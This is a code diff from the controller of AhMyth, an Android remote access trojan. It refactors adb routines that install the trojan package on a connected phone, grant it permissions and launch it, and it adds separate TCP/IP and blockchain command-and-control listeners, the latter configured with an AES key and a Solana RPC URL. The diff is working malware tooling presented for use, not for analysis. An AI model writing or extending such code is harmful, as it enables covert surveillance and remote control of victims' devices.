-                    execCallback(`adb -P ${adbPort} -s ${deviceId} shell pm grant ahmyth.mine.king.ahmyth ${perm}`, { timeout: 5000 }, () => resolve());
-                });
+                try {
+                    await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} shell pm grant ahmyth.mine.king.ahmyth ${perm}`, 5000);
+                } catch (e) {
+                    // Ignore permission grant errors (some permissions may not be grantable)
+                }
             }
             $appCtrl.Log('[✓] Permissions granted', CONSTANTS.logStatus.SUCCESS);
             
             // Launch the app
             $appCtrl.Log('[→] Launching app...', CONSTANTS.logStatus.INFO);
-            await new Promise((resolve, reject) => {
-                execCallback(`adb -P ${adbPort} -s ${deviceId} shell am start -n ahmyth.mine.king.ahmyth/.MainActivity`, { timeout: 10000 }, (err) => {
-                    if (err) {
-                        // Try alternative launch method
-                        execCallback(`adb -P ${adbPort} -s ${deviceId} shell monkey -p ahmyth.mine.king.ahmyth -c android.intent.category.LAUNCHER 1`, { timeout: 10000 }, (err2) => {
-                            if (err2) reject(new Error('Failed to launch app'));
-                            else resolve();
-                        });
-                    } else {
-                        resolve();
-                    }
-                });
-            });
+            try {
+                await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} shell am start -n ahmyth.mine.king.ahmyth/.MainActivity`, 10000);
+            } catch (e) {
+                // Try alternative launch method
+                try {
+                    await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} shell monkey -p ahmyth.mine.king.ahmyth -c android.intent.category.LAUNCHER 1`, 10000);
+                } catch (e2) {
+                    $appCtrl.Log('[⚠] Failed to launch app automatically, but installation succeeded', CONSTANTS.logStatus.WARNING);
+                }
+            }
             
             $appCtrl.Log('[✓] App launched successfully!', CONSTANTS.logStatus.SUCCESS);
             $appCtrl.Log('[ℹ] Waiting for device to connect...', CONSTANTS.logStatus.INFO);
@@ -1684,14 +2300,17 @@ app.controller("AppCtrl", ($scope, $sce) => {
             const { deviceId, adbPort } = await $appCtrl.getConnectedDevice();
             $appCtrl.Log(`[ℹ] Found device: ${deviceId}`, CONSTANTS.logStatus.INFO);
             
-            execCallback(`adb -P ${adbPort} -s ${deviceId} uninstall ahmyth.mine.king.ahmyth`, { timeout: 15000 }, (err, stdout) => {
-                if (err || (stdout && stdout.includes('Failure'))) {
+            try {
+                const output = await execAdbWithTimeout(`adb -P ${adbPort} -s ${deviceId} uninstall ahmyth.mine.king.ahmyth`, 15000);
+                if (output && output.includes('Failure')) {
                     $appCtrl.Log('[ℹ] App was not installed or already uninstalled', CONSTANTS.logStatus.INFO);
                 } else {
                     $appCtrl.Log('[✓] App uninstalled successfully', CONSTANTS.logStatus.SUCCESS);
                 }
-                if (!$appCtrl.$$phase) $appCtrl.$apply();
-            });
+            } catch (e) {
+                $appCtrl.Log('[ℹ] App was not installed or already uninstalled', CONSTANTS.logStatus.INFO);
+            }
+            if (!$appCtrl.$$phase) $appCtrl.$apply();
         } catch (e) {
             $appCtrl.Log(`[✗] ${e.message}`, CONSTANTS.logStatus.FAIL);
         }
@@ -1741,9 +2360,9 @@ app.controller("AppCtrl", ($scope, $sce) => {
         onlyFailing: false
     };
     // Initialize test config blockchain fields from current app settings
-    $appCtrl.testConfig.blockchainRpcUrl = $appCtrl.blockchainRpcUrl || $appCtrl.blockchainC2RpcUrl || '';
+    $appCtrl.testConfig.blockchainRpcUrl = $appCtrl.builder.blockchainRpcUrl || $appCtrl.blockchainC2RpcUrl || '';
     $appCtrl.testConfig.blockchainContract = $appCtrl.blockchainContract || $appCtrl.blockchainC2Contract || '';
-    $appCtrl.testConfig.blockchainAesKey = $appCtrl.blockchainC2AesKey || '';
+    $appCtrl.testConfig.blockchainAesKey = $appCtrl.builder.blockchainC2AesKey || '';
     
     $appCtrl.availableDevices = [];
     $appCtrl.isRunning = false;
@@ -2119,34 +2738,32 @@ app.controller("AppCtrl", ($scope, $sce) => {
         }
     };
 
-    // when user clicks Listen button
-    $appCtrl.Listen = (port) => {
+    // TCP/IP listener
+    $appCtrl.ListenTCP = (port) => {
         if (!port) {
             port = CONSTANTS.defaultPort;
         }
-        
-        // Always start TCP/IP listener
         $appCtrl.Log(`[→] Initiating TCP/IP server on port ${port}...`, CONSTANTS.logStatus.INFO);
         ipcRenderer.send("SocketIO:Listen", port);
+    };
+
+    // Blockchain listener
+    $appCtrl.ListenBlockchain = () => {
+        const channelAddr = $appCtrl.blockchainContract || $appCtrl.blockchainC2Contract;
+        const aesKey = $appCtrl.builder.blockchainC2AesKey;
+        const rpcUrl = $appCtrl.builder.blockchainRpcUrl;
+        const rpcFallbacks = $appCtrl.builder.blockchainRpcFallbacks;
         
-        // Also start blockchain listener if blockchain C2 is configured
-        if ($appCtrl.blockchainC2Enabled || $appCtrl.connectionType === 'blockchain') {
-            const channelAddr = $appCtrl.blockchainContract || $appCtrl.blockchainC2Contract;
-            const aesKey = $appCtrl.blockchainC2AesKey;
-            const rpcUrl = $appCtrl.blockchainRpcUrl;
-            const rpcFallbacks = $appCtrl.blockchainRpcFallbacks;
-            
-            if (channelAddr && aesKey) {
-                $appCtrl.Log(`[→] Starting blockchain C2 listener...`, CONSTANTS.logStatus.INFO);
-                ipcRenderer.send("Blockchain:Listen", {
-                    channelAddress: channelAddr,
-                    aesKey: aesKey,
-                    rpcUrl: rpcUrl || 'https://api.devnet.solana.com',
-                    rpcFallbacks: rpcFallbacks || ''
-                });
-            } else {
-                $appCtrl.Log(`[ℹ] Blockchain C2 not fully configured (need channel address and AES key)`, CONSTANTS.logStatus.INFO);
-            }
+        if (channelAddr && aesKey) {
+            $appCtrl.Log(`[→] Starting blockchain C2 listener...`, CONSTANTS.logStatus.INFO);
+            ipcRenderer.send("Blockchain:Listen", {
+                channelAddress: channelAddr,
+                aesKey: aesKey,
+                rpcUrl: rpcUrl || 'https://api.devnet.solana.com',
+                rpcFallbacks: rpcFallbacks || ''
+            });
+        } else {
+            $appCtrl.Log(`[ℹ] Blockchain C2 not fully configured (need channel address and AES key)`, CONSTANTS.logStatus.INFO);
         }
     };
 
